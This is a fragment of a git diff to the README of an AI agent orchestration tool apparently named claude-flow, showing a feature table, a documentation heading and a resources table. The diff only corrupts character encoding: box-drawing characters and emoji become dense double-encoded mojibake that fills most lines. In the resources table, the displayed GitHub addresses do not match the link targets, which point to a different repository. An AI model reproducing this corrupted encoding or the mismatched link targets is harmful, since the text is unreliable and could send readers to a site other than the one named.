Â¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â¤
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ Memory Search         ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ 150x - 12,500x faster (HNSW)        ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ Pattern Matching      ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ Self-learning (ReasoningBank)       ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ Security              ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ CVE remediation + strict validation ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ Modular Architecture  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ 18 @claude-flow/* packages          ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ Agent Coordination    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ 16 specialized agent roles + custom types              ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ Token Efficiency      ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ 32% reduction with optimization     ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â´ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‹Å“
 ```
 
 ### Breaking Changes
@@ -7582,7 +7582,7 @@ cp -r ./data-backup-v2 ./data
 ---
 
 <details>
-<summary>Ã°Å¸â€œÅ¡ <strong>Documentation</strong></summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã…Â¡ <strong>Documentation</strong></summary>
 
 
 ### V3 Module Documentation
@@ -7619,10 +7619,10 @@ cp -r ./data-backup-v2 ./data
 
 | Resource | Link |
 |----------|------|
-| Ã°Å¸â€œÅ¡ Documentation | [github.com/ruvnet/claude-flow](https://github.com/pwnapplehat/ruflo) |
-| Ã°Å¸Ââ€º Issues & Bugs | [github.com/ruvnet/claude-flow/issues](https://github.com/pwnapplehat/ruflo/issues) |
-| Ã°Å¸â€™Â¼ Professional Implementation | [ruv.io](https://ruv.io) Ã¢â‚¬â€ Enterprise consulting, custom integrations, and production deployment |
-| Ã°Å¸â€™Â¬ Discord Community | [Agentics Foundation](https://discord.com/invite/dfxmpwkG2D) |
+| ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã…Â¡ Documentation | [github.com/ruvnet/claude-flow](https://github.com/pwnapplehat/ruflo) |
+| ÃƒÂ°Ã…Â¸Ã‚ÂÃ¢â‚¬Âº Issues & Bugs | [github.com/ruvnet/claude-flow/issues](https://github.com/pwnapplehat/ruflo/issues) |
+| ÃƒÂ°Ã…Â¸Ã¢â‚¬â„¢Ã‚Â¼ Professional Implementation | [ruv.io](https://ruv.io) ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Enterprise consulting, custom integrations, and production deployment |
+| ÃƒÂ°Ã…Â¸Ã¢â‚¬â„¢Ã‚Â¬ Discord Community | [Agentics Foundation](https://discord.com/invite/dfxmpwkG2D) |
 
 ## License
 
